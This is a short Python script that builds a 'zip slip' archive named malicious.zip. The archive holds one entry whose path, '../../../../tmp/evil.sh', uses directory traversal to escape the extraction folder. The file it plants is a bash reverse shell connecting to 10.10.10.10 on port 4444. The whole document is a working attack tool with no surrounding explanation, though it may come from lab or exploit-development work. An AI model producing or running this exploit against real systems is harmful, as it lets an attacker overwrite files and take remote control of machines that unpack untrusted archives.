#!/usr/bin/env python3
import zipfile

def create_zip_slip(filename, target_path, content):
    """Create a zip slip archive"""
    with zipfile.ZipFile(filename, 'w') as zf:
        info = zipfile.ZipInfo(target_path)
        zf.writestr(info, content)

# Create malicious zip
create_zip_slip(
    'malicious.zip',
    '../../../../tmp/evil.sh',
    '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
)
